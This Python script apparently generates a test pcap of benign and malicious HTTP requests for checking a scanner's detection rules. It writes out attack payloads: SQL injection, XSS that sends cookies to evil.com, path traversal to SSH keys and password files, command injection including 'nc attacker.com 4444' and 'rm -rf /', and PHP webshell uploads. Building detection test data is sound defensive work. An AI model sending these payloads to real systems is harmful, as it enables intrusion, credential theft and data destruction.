#!/usr/bin/env python3
"""
HTTP攻击流量pcap文件生成器
用于生成测试用的HTTP攻击流量pcap文件
"""

import struct
import socket
import random
import os
from scapy.all import *

# Scapy可用性检查
try:
    from scapy.all import *
    HAVE_SCAPY = True
except ImportError:
    HAVE_SCAPY = False
    print("警告: 未安装Scapy，将创建简化的pcap文件")

class HTTPAttackGenerator:
    def __init__(self):
        self.packets = []
        self.src_ip = "192.168.1.100"
        self.dst_ip = "192.168.1.1"
        self.src_port = 12345
        self.dst_port = 80

    def create_ip_packet(self, payload):
        """创建IP数据包"""
        if HAVE_SCAPY:
            # 使用Scapy创建完整的数据包
            ether = Ether()
            ip = IP(src=self.src_ip, dst=self.dst_ip, ttl=64)
            tcp = TCP(sport=self.src_port, dport=self.dst_port, flags="PA", seq=random.randint(1000, 50000))
            packet = ether / ip / tcp / Raw(load=payload)
            return packet
        else:
            # 简化的数据包创建（仅用于演示）
            return payload

    def add_normal_request(self):
        """添加正常HTTP请求"""
        normal_requests = [
            "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            "GET /about.html HTTP/1.1\r\nHost: example.com\r\nAccept: text/html\r\n\r\n",
            "POST /contact.html HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\n\r\n"
        ]

        for request in normal_requests:
            packet = self.create_ip_packet(request)
            self.packets.append(packet)

    def add_admin_access(self):
        """添加管理员访问攻击"""
        admin_attacks = [
            "GET /admin HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.68.0\r\n\r\n",
            "GET /admin/login.php HTTP/1.1\r\nHost: example.com\r\nUser-Agent: python-requests/2.28.1\r\n\r\n",
            "POST /admin/panel.php HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n",
            "GET /administrator HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Nmap Scripting Engine\r\n\r\n"
        ]

        for attack in admin_attacks:
            packet = self.create_ip_packet(attack)
            self.packets.append(packet)

    def add_sql_injection(self):
        """添加SQL注入攻击"""
        sql_attacks = [
            "GET /search.php?q=test' OR '1'='1 HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            "POST /login.php HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin' OR '1'='1&password=anything",
            "GET /user.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\r\nHost: example.com\r\nUser-Agent: sqlmap/1.6.12\r\n\r\n",
            "POST /search.php HTTP/1.1\r\nHost: example.com\r\n\r\nquery=test'; DROP TABLE users; --"
        ]

        for attack in sql_attacks:
            packet = self.create_ip_packet(attack)
            self.packets.append(packet)

    def add_xss_attacks(self):
        """添加XSS攻击"""
        xss_attacks = [
            "GET /search.php?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            "POST /comment.php HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ncomment=<img src=x onerror=alert('XSS')>",
            "GET /profile.php?name=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script> HTTP/1.1\r\nHost: example.com\r\n\r\n",
            "POST /update.php HTTP/1.1\r\nHost: example.com\r\n\r\nbio=javascript:alert('XSS')"
        ]

        for attack in xss_attacks:
            packet = self.create_ip_packet(attack)
            self.packets.append(packet)

    def add_directory_traversal(self):
        """添加目录遍历攻击"""
        dt_attacks = [
            "GET /file.php?path=../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.68.0\r\n\r\n",
            "GET /download.php?file=../../../../root/.ssh/id_rsa HTTP/1.1\r\nHost: example.com\r\nUser-Agent: wget/1.20.3\r\n\r\n",
            "GET /view.php?doc=..\\..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1\r\nHost: example.com\r\n\r\n",
            "GET /image.php?img=../../../../../var/log/apache2/access_log HTTP/1.1\r\nHost: example.com\r\n\r\n"
        ]

        for attack in dt_attacks:
            packet = self.create_ip_packet(attack)
            self.packets.append(packet)

    def add_command_injection(self):
        """添加命令注入攻击"""
        cmd_attacks = [
            "GET /ping.php?host=8.8.8.8; ls -la HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.68.0\r\n\r\n",
            "POST /lookup.php HTTP/1.1\r\nHost: example.com\r\n\r\ndomain=test.com; cat /etc/passwd",
            "GET /whois.php?query=example.com | nc attacker.com 4444 HTTP/1.1\r\nHost: example.com\r\n\r\n",
            "POST /dns.php HTTP/1.1\r\nHost: example.com\r\n\r\naddress=google.com; rm -rf /"
        ]

        for attack in cmd_attacks:
            packet = self.create_ip_packet(attack)
            self.packets.append(packet)

    def add_webshell_uploads(self):
        """添加Webshell上传攻击"""
        webshell_attacks = [
            "POST /upload.php HTTP/1.1\r\nHost: example.com\r\nContent-Type: multipart/form-data\r\n\r\n--boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system($_GET['cmd']); ?>\r\n--boundary--",
            "POST /avatar.php HTTP/1.1\r\nHost: example.com\r\n\r\navatar_data=<?php eval($_POST['c']); ?>",
            "GET /test.php?cmd=id HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        ]

        for attack in webshell_attacks:
            packet = self.create_ip_packet(attack)
            self.packets.append(packet)

    def add_scanner_traffic(self):
        """添加扫描器流量"""
        scanner_attacks = [
            "GET /robots.txt HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Nikto/2.1.6\r\n\r\n",
            "GET /phpmyadmin/ HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Nmap Scripting Engine\r\n\r\n",
            "GET /wp-admin/ HTTP/1.1\r\nHost: example.com\r\nUser-Agent: sqlmap/1.6.12\r\n\r\n",
            "GET /administrator/ HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (compatible; Nuclei)\r\n\r\n",
            "GET /wp-login.php HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Burp Suite\r\n\r\n"
        ]

        for attack in scanner_attacks:
            packet = self.create_ip_packet(attack)
            self.packets.append(packet)

    def generate_pcap(self, output_file):
        """生成pcap文件"""
        print(f"正在生成pcap文件: {output_file}")

        # 添加各种攻击流量
        self.add_normal_request()
        self.add_admin_access()
        self.add_sql_injection()
        self.add_xss_attacks()
        self.add_directory_traversal()
        self.add_command_injection()
        self.add_webshell_uploads()
        self.add_scanner_traffic()

        print(f"已生成 {len(self.packets)} 个数据包")

        if HAVE_SCAPY:
            # 使用Scapy写入pcap文件
            wrpcap(output_file, self.packets)
            print(f"✅ pcap文件已生成: {output_file}")
        else:
            # 创建简化的pcap文件头和数据
            self.create_simple_pcap(output_file)

    def create_simple_pcap(self, output_file):
        """创建简化的pcap文件（无Scapy时使用）"""
        # pcap文件头
        pcap_header = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

        with open(output_file, 'wb') as f:
            f.write(pcap_header)

            for packet_data in self.packets:
                # 简化的数据包头（16字节时间戳 + 4字节长度）
                timestamp = int(time.time())
                ts_sec = timestamp
                ts_usec = 0
                captured_len = len(packet_data)
                actual_len = len(packet_data)

                packet_header = struct.pack('<LLLL', ts_sec, ts_usec, captured_len, actual_len)
                f.write(packet_header)
                f.write(packet_data.encode() if isinstance(packet_data, str) else packet_data)

        print(f"✅ 简化pcap文件已生成: {output_file}")

def main():
    """主函数"""
    print("HTTP攻击流量pcap文件生成器")
    print("=" * 50)

    if len(sys.argv) != 2:
        print("用法: python3 generate_test_pcap.py <output.pcap>")
        print("示例: python3 generate_test_pcap.py test_attacks.pcap")
        sys.exit(1)

    output_file = sys.argv[1]

    # 检查Scapy可用性
    if not HAVE_SCAPY:
        print("⚠️  警告: 未安装Scapy，生成的pcap文件功能有限")
        print("安装Scapy: pip3 install scapy")
        print()

    # 生成攻击流量
    generator = HTTPAttackGenerator()

    print("正在生成以下攻击流量:")
    print("  - 正常HTTP请求")
    print("  - 管理员访问攻击")
    print("  - SQL注入攻击")
    print("  - XSS攻击")
    print("  - 目录遍历攻击")
    print("  - 命令注入攻击")
    print("  - Webshell上传攻击")
    print("  - 扫描器流量")
    print()

    try:
        generator.generate_pcap(output_file)
        print()
        print("📊 生成统计:")
        print(f"  - 输出文件: {output_file}")
        print(f"  - 数据包数量: {len(generator.packets)}")
        print(f"  - 文件大小: {os.path.getsize(output_file)} 字节")
        print()
        print("💡 使用方法:")
        print(f"  ./http_scanner --rules ./rules --pcap {output_file}")

    except Exception as e:
        print(f"❌ 生成失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()